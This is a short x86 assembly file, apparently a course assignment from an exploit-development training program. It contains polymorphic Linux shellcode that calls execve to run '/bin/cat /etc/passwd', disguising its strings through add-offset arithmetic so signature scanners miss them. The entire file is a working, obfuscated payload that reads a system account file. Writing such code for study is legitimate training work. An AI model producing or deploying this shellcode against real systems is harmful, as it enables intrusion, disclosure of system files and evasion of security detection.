; Author: John Stigerwalt
; SLAE: Assignment #6
;Polymorphic Shellcode execve: /bin/cat /etc/passwd

section .text

global _start

_start:


xor eax, eax
cdq
xchg edi, eax
xchg esi, edi
;xor edx, edx
;xchg eax, edx
push edx

mov esi, 0x10101010
mov edi, 0x6451531f
;push dword 0x7461632f
add edi, esi
push edi

mov edi, 0x5e59521f
;push dword 0x6e69622f
add edi, esi
push edi

mov ebx, esp
push edx

mov edi, 0x54676363
;push dword 0x64777373
add edi, esi
push edi

mov edi, 0x51601f1f
;push dword 0x61702f2f
add edi, esi
push edi

mov edi, 0x5364551f
;push dword 0x6374652f
add edi, esi
push edi

mov ecx, esp
;mov al, 0xb
push 0xb
pop eax

push edx
push ecx
push ebx
mov ecx, esp
int 0x80
